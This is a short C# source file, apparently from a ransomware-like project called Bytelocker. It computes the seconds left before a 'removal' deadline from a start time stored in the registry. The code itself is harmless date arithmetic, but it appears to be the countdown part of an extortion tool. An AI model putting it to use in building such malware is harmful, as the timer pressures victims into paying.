using Bytelocker.CryptoManager;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Bytelocker
{
    class TimeManager
    {
        public static double DetermineRemainingTimeInSeconds()
        {
            RegistryManager rm = new RegistryManager();
            
            DateTime initial_date = DateTime.Parse(rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "time"));
            DateTime due_date = initial_date.AddHours(Bytelocker.TIME_TILL_REMOVAL_HOURS);

            TimeSpan finalDate = due_date.Subtract(DateTime.Now);

            return Math.Round(finalDate.TotalSeconds);
        }
    }
}
